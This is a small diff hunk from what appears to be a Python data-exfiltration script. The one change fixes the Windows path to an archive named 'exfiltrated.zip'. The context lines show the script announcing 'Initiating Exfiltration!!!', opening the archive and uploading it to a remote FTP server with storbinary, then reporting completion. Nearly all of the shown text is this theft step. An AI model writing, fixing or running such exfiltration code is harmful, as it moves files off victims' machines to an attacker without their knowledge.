@@ -95,7 +95,7 @@ except:
 try:
     print()
     print("Initiating Exfiltration!!!")
-    file = open(cwd+"\exfiltrated.zip", 'rb')
+    file = open(cwd+"\\exfiltrated.zip", 'rb')
     ftp.storbinary(f"STOR exfiltrated.zip", file)
     print()
     print("Exfiltration Complete!!!")
